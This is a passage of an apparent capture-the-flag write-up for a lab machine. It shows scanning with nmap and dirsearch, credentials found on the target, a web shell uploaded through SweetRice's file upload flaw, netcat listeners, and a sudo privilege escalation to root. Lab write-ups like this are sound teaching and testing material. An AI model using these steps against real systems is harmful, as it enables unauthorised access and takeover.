...
```
kali@kali:~/CTFs$ sudo nmap -A -sS -sC -sV -O 10.10.230.157
...
```
kali@kali:~/CTFs$ sudo /opt/dirsearch/dirsearch.py -u 10.10.230.157 -w /usr/share/dirb/wordlists/common.txt -e html,php
...
2. SweetRice 1.5.1 - Arbitrary File Upload

  you can upload any file We upload Our Shell here see it later  
...
We Get Username & Password 

`manager:Password123'



# Directory Brute Force in /content 

```
kali@kali:~/CTFs$ sudo /opt/dirsearch/dirsearch.py -u 10.10.230.157/content -w /usr/share/dirb/wordlists/common.txt -e html,php
[sudo] password for kali:
...
Now we use 2nd Exploit to upload Shell 

go to media center and Upload a shell.phtml 
 
[http://10.10.230.157/content/as/?type=media_center](http://10.10.230.157/content/as/?type=media_center)

`http://10.10.230.157/content/attachment/shell.phtml`


Start Netcat Listener 
```
kali@kali:~/CTFs$ nc -lnvp 7777
...
```
See there is sudo allow and you can run backup.pl 
and /etc/copy.sh can run at same time 


now we OverWrite this file with shell code  
...
Now Run this file backup.pl
`
$ sudo /usr/bin/perl /home/itguy/backup.pl
rm: cannot remove '/tmp/f': No such file or directory
`

See you get Root Shell
```
kali@kali:~/CTFs$ nc -lnvp 5554
